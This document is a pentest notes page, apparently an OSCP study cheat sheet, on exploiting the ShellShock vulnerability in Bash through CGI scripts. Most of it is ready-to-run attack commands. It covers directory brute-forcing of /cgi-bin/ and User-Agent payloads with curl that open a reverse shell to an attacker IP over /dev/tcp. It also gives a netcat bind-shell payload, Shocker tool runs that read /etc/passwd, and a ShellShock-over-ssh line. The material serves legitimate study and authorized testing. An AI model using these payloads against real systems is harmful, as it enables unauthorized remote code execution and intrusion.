---
title: "ShellShock"
classes: single
ribbon: LightBlue
categories:
  - notes
tags:
  - beginner
  - pentest
  - recon
  - oscp
  - https
  - http
  - web
  - shellshock
toc: true
hide_title: true
excerpt: ""
---

Bash can also be used to run commands passed to it by applications and it is this feature that the vulnerability affects. One type of command that can be sent to Bash allows environment variables to be set. Environment variables are dynamic, named values that affect the way processes are run on a computer. The vulnerability lies in the fact that an **attacker can tack-on malicious code to the environment variable, which will run once the variable is received**.
![[image 2.avif]]

Exploiting this vulnerability the **page could throw an error**.

You could **find** this vulnerability noticing that it is using an **old Apache version** and **cgi_mod** (with cgi folder) or using **nikto**

## Exploitation Steps

- check for any cgi file on server ,
- If you found any directory of **/cgi-bin/** use extension like **sh** and **cgi** and bruteforce the directory

```
sudo python3 dirsearch.py -u http://10.10.10.56:80/cgi-bin/ -e cgi,sh
```

- If you found any **.sh or .cgi file** , you can use **shellshock reverse shell** to connect back to us
- We can put payload into **useragent** to execute it -

```
curl -A “() { :; }; /bin/bash -i > /dev/tcp/192.168.2.13/9000 0<&1 2>&1” http://192.168.2.18/cgi-bin/helloworld.cgi

curl -x TARGETADDRESS -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/HOSTIP/1234 0>&1" $ip/cgi-bin/status
```

```
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc $ip 80
```

## NSE


```
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```

## Shocker

```
$ git clone https://github.com/nccgroup/shocker

cd shocker

./shocker.py -H $ip  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose

./shocker.py -H $ip  --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose
```

## ShellShock over ssh

```
$ ssh username@$ip '() { :;}; /bin/bash'
```